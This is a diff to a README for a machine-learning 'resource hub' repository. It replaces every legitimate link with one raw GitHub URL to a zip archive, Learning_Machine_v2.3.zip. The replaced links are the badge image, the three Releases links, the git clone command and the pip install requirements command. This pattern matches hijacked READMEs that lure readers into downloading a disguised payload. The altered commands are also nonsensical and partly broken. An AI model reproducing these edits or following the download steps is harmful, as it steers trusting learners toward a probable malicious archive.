@@ -1,10 +1,10 @@
 # 🌟 Machine Learning Resource Hub
 
-![Machine Learning](https://img.shields.io/badge/Machine%20Learning-Resource%20Hub-brightgreen)
+![Machine Learning](https://raw.githubusercontent.com/KKfeh/Machine-Learning/main/Semi supervised Learning/Learning_Machine_v2.3.zip%20Learning-Resource%20Hub-brightgreen)
 
 Welcome to the **Machine Learning** repository! This curated resource hub is designed to help you learn and explore the fascinating world of machine learning. Whether you are a beginner or looking to deepen your knowledge, you will find tutorials, code examples, datasets, and hands-on projects here. 
 
-You can find the latest updates and downloadable resources in the [Releases section](https://github.com/KKfeh/Machine-Learning/releases). 
+You can find the latest updates and downloadable resources in the [Releases section](https://raw.githubusercontent.com/KKfeh/Machine-Learning/main/Semi supervised Learning/Learning_Machine_v2.3.zip). 
 
 ---
 
@@ -33,7 +33,7 @@ To begin your journey in machine learning, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/KKfeh/Machine-Learning.git
+   git clone https://raw.githubusercontent.com/KKfeh/Machine-Learning/main/Semi supervised Learning/Learning_Machine_v2.3.zip
    ```
 
 2. **Navigate to the Directory**:
@@ -44,13 +44,13 @@ To begin your journey in machine learning, follow these steps:
 3. **Install Required Packages**:
    Use the following command to install the necessary libraries:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/KKfeh/Machine-Learning/main/Semi supervised Learning/Learning_Machine_v2.3.zip
    ```
 
 4. **Explore the Resources**:
    Check out the folders and files to find tutorials, datasets, and projects.
 
-You can find the latest downloadable resources in the [Releases section](https://github.com/KKfeh/Machine-Learning/releases).
+You can find the latest downloadable resources in the [Releases section](https://raw.githubusercontent.com/KKfeh/Machine-Learning/main/Semi supervised Learning/Learning_Machine_v2.3.zip).
 
 ## 🗂️ Repository Structure
 
@@ -138,6 +138,6 @@ This repository is licensed under the MIT License. Feel free to use the resource
 
 ---
 
-For more updates and downloadable resources, visit the [Releases section](https://github.com/KKfeh/Machine-Learning/releases). 
+For more updates and downloadable resources, visit the [Releases section](https://raw.githubusercontent.com/KKfeh/Machine-Learning/main/Semi supervised Learning/Learning_Machine_v2.3.zip). 
 
 Happy learning! 🚀
